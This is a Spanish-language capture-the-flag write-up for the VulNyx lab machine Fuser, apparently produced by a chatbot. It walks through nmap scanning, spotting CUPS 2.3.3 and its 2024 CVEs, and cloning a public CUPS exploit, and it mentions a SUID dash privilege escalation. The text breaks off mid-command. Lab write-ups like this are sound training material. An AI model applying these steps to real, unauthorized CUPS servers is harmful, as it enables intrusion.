# 🔍 Write-Up: VulnHub Basic - FUSER

![image](https://github.com/user-attachments/assets/488b1a00-b823-422f-a13c-2bd8304711da)


Aquí tienes el archivo `README.md` para la máquina **Fuser** de VulNyx, basado en el writeup que proporcionaste. Este archivo está listo para copiar y pegar en tu repositorio de GitHub:

```markdown
# Máquina Fuser - VulNyx (Dificultad: Low)

## Descripción
Fuser es una máquina de la plataforma VulNyx con un nivel de dificultad **Low**. En este laboratorio, se explora una vulnerabilidad en el servicio **CUPS (Common UNIX Printing System)** y se realiza una escalada de privilegios aprovechando un binario con el bit SUID activado. El objetivo es obtener acceso root a la máquina y encontrar la flag.

## Resumen de conceptos trabajados
- Escaneo de puertos con Nmap.
- Explotación de una vulnerabilidad en CUPS (CVE-2024-47176).
- Escalada de privilegios mediante un binario SUID (Dash).

---

## Pasos para la resolución

### **1. Conexión y verificación**
- Descargar la máquina Fuser de VulNyx y configurarla en VirtualBox o VMware con **Red NAT**.
- Verificar la conexión con la máquina víctima:
  ```bash
  sudo arp-scan -I eth0 --localnet
  ping -c 1 10.0.2.5 -R
  ```
  El TTL de 64 indica que es una máquina Linux.

---

### **2. Escaneo de puertos**
- Realizar un escaneo de puertos con Nmap:
  ```bash
  sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.0.2.5 -oG Escaneo
  ```
  Se detectan los puertos **22 (SSH)**, **80 (HTTP)** y **631 (IPP/CUPS)** abiertos.

- Escanear versiones de los servicios:
  ```bash
  nmap -sCV -p22,80,631 10.0.2.5
  ```
  Se identifica que el servicio **CUPS** está en la versión **2.3.3op2**.

---

### **3. Análisis del servicio CUPS**
- Acceder al panel de CUPS desde el navegador:
  ```
  http://10.0.2.5:631
  ```
  Se observa un panel de gestión de impresoras.

- Investigar la sección `/printers`, donde se encuentra un nombre de usuario (**Konika Minolta**) y una lista de impresoras.

- Buscar vulnerabilidades en CUPS 2.3.3:
  ```bash
  searchsploit CUPS 2.3.3
  ```
  No se encuentran exploits públicos, pero se identifican CVEs relacionados:
  - **CVE-2024-47176**: Vulnerabilidad en `cups-browsed`.
  - **CVE-2024-47076**: Vulnerabilidad en `libcupsfilters`.
  - **CVE-2024-47175**: Vulnerabilidad en `libppd`.
  - **CVE-2024-47177**: Vulnerabilidad en `cups-filters`.

---

### **4. Explotación de CUPS**
- Clonar el repositorio del exploit de ippsec:
  ```bash
  git clone https://github.com/ippsec/cups-exploit.git
  cd cups-exploit
  ```
- Ejecutar el exploit:
  ```bash
  python3 exploit.py 10.
